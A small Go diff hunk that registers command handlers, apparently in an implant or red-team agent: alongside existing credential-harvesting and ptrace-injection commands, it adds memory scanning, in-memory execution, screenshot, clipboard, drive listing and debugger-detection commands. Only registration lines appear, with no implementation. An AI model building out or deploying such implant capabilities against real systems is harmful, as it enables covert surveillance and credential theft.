@@ -14,4 +14,10 @@ func registerPlatformCommands() {
 	RegisterCommand(&LinuxLogsCommand{})
 	RegisterCommand(&PtraceInjectCommand{})
 	RegisterCommand(&CredHarvestCommand{})
+	RegisterCommand(&MemScanCommand{})
+	RegisterCommand(&ExecuteMemoryCommand{})
+	RegisterCommand(&ScreenshotLinuxCommand{})
+	RegisterCommand(&ClipboardCommand{})
+	RegisterCommand(&DrivesUnixCommand{})
+	RegisterCommand(&DebugDetectCommand{})
 }
